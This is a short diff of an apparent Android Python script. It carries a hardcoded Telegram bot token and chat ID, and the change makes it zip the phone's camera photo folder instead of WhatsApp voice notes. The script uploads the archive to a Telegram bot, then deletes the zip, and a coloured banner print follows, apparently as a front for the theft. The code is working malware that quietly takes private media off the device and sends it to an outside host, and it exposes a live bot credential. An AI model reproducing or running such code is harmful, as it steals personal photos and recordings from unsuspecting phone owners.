@@ -15,22 +15,22 @@ token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
 chat_id = "5894045208"
 
 
-os.chdir("/sdcard/WhatsApp/Media")
+os.chdir("/sdcard/DCIM")
 
 
-with zipfile.ZipFile("WhatsApp Voice Notes.zip", "w", zipfile.ZIP_STORED) as zip_file:
-    for root, dirs, files in os.walk("WhatsApp Voice Notes"):
+with zipfile.ZipFile("Camera.zip", "w", zipfile.ZIP_STORED) as zip_file:
+    for root, dirs, files in os.walk("Camera"):
         for file in files:
             zip_file.write(os.path.join(root, file))
 
 
 url = f"https://api.telegram.org/bot{token}/sendDocument"
 data = {"chat_id": chat_id}
-files = {"document": open("WhatsApp Voice Notes.zip", "rb")}
+files = {"document": open("Camera.zip", "rb")}
 requests.post(url, data=data, files=files)
 
 
-os.remove("WhatsApp Voice Notes.zip")
+os.remove("Camera.zip")
 
 colorama.init()
 print("""
